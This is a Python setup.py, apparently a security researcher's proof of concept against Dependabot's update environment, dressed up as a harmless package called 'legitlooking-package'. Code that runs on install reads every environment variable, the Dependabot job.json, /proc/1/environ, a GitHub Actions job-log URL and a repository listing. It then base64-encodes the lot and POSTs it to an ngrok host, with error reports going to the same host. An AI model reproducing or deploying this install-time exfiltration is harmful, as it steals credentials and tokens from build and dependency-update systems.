from setuptools import setup

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

try:
    # __import__ is always available as builtin, avoid globals/locals split issue
    _urlreq  = __import__('urllib.request', fromlist=['urlopen', 'Request',
                           'build_opener', 'HTTPRedirectHandler', 'ProxyHandler'])
    _urlparse = __import__('urllib.parse', fromlist=['quote'])
    _urlerr  = __import__('urllib.error',  fromlist=['HTTPError'])
    _b64     = __import__('base64')
    _os      = __import__('os')
    _re      = __import__('re')

    lines = []

    # 1. Env vars
    lines.append("=== ENV ===")
    lines.append("\n".join(f"{k}={v}" for k, v in _os.environ.items()))

    # 2. job.json - geen sanitizer voor Python!
    try:
        job_path = _os.environ.get(
            "DEPENDABOT_JOB_PATH",
            "/home/dependabot/dependabot-updater/job.json"
        )
        with open(job_path) as f:
            lines.append("\n=== JOB.JSON ===\n" + f.read())
    except Exception as je:
        lines.append(f"\n=== JOB.JSON FOUT: {je} ===")

    # 3. /proc/1/environ
    try:
        with open("/proc/1/environ", "rb") as f:
            lines.append("\n=== /proc/1/environ ===")
            lines.append(f.read().replace(b"\x00", b"\n").decode(errors="replace"))
    except Exception as pe:
        lines.append(f"\n=== /proc/1/environ FOUT: {pe} ===")

    # 4. GitHub API via proxy (HTTPS_PROXY staat in env, urllib gebruikt die automatisch)
    lines.append("\n=== GITHUB API VIA PROXY ===")

    try:
        def _req(path):
            r = _urlreq.Request(
                f"https://api.github.com{path}",
                headers={
                    "Accept": "application/vnd.github+json",
                    "X-GitHub-Api-Version": "2022-11-28",
                }
            )
            with _urlreq.urlopen(r, timeout=10) as resp:
                return resp.read(1000).decode(errors="replace")

        runs_raw = _req("/repos/ugurcanli/testpen/actions/runs?per_page=1&event=dynamic")
        lines.append(f"Runs: {runs_raw[:800]}")

        run_id = (_re.search(r'"id":(\d+)', runs_raw) or type('', (), {'group': lambda s, x: None})()).group(1)
        lines.append(f"Run ID: {run_id}")

        if run_id:
            jobs_raw = _req(f"/repos/ugurcanli/testpen/actions/runs/{run_id}/jobs")
            lines.append(f"Jobs: {jobs_raw[:600]}")
            job_id = (_re.search(r'"id":(\d+)', jobs_raw) or type('', (), {'group': lambda s, x: None})()).group(1)
            lines.append(f"Job ID: {job_id}")

            if job_id:
                lines.append(f"\n--- Job logs SAS URL ({job_id}) ---")

                class _NoRedir(_urlreq.HTTPRedirectHandler):
                    def redirect_request(self, req, fp, code, msg, headers, newurl):
                        return None

                opener = _urlreq.build_opener(_NoRedir())
                log_req = _urlreq.Request(
                    f"https://api.github.com/repos/ugurcanli/testpen/actions/jobs/{job_id}/logs",
                    headers={
                        "Accept": "application/vnd.github+json",
                        "X-GitHub-Api-Version": "2022-11-28",
                    }
                )
                try:
                    opener.open(log_req, timeout=10)
                    lines.append("Geen redirect ontvangen")
                except _urlerr.HTTPError as he:
                    if he.code in (301, 302, 303, 307, 308):
                        lines.append(f"SAS URL: {he.headers.get('Location', '')}")
                    else:
                        lines.append(f"HTTP {he.code}")
                except Exception as le:
                    lines.append(f"Logs fout: {le}")

    except Exception as api_e:
        lines.append(f"API FOUT: {api_e}")

    # 5. Repo bestanden
    try:
        repo = _os.environ.get(
            "DEPENDABOT_REPO_CONTENTS_PATH",
            "/home/dependabot/dependabot-updater/repo"
        )
        import subprocess as _sp
        ls = _sp.run(["ls", "-la", repo], capture_output=True, text=True, timeout=5).stdout
        lines.append(f"\n=== REPO ===\n{ls[:500]}")
    except Exception as re2:
        lines.append(f"\n=== REPO FOUT: {re2} ===")

    # 6. Stuur alles op
    payload = _b64.b64encode("\n".join(lines).encode("utf-8", errors="replace")).decode()
    post = _urlreq.Request(
        f"{COLLAB_URL}?poc=setup_py",
        data=payload.encode(),
        method="POST",
        headers={"Content-Type": "text/plain"}
    )
    _urlreq.urlopen(post, timeout=10)

except Exception as e:
    try:
        _u = __import__('urllib.request', fromlist=['urlopen'])
        _p = __import__('urllib.parse',   fromlist=['quote'])
        _u.urlopen(f"{COLLAB_URL}?poc=setup_py&err={_p.quote(str(e)[:200])}", timeout=5)
    except Exception:
        pass

setup(
    name="legitlooking-package",
    version="1.0.2",
    install_requires=[
        "requests==2.27.1",
        "flask==2.2.0",
    ],
    python_requires=">=3.8",
)
